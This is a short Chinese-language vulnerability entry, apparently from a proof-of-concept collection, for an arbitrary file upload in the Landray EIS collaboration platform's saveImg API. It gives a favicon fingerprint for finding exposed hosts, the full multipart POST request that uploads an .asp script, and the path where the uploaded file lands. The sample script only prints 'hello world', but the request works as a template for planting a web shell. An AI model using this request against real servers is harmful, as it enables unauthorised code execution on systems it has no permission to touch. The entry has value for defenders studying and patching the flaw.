# 蓝凌EIS智慧协同平台saveImg接口任意文件上传

- **系统**：蓝凌EIS智慧协同平台saveImg接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`POST /eis/service/api.aspx?action=saveImg HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary`　`Content-Length: 198`

**请求体 / payload**
```
------WebKitFormBoundary
Content-Disposition:form-data;name="file"filename="a.asp"
Content-Type: text/html
<% response.write("hello world")%>
------WebKitFormBoundary--

上传文件位置
/files/editor_img/20230927102035735197/20230927102035735197.asp
```

**其他**
- 蓝凌 EIS智慧协同平台saveImg接口任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台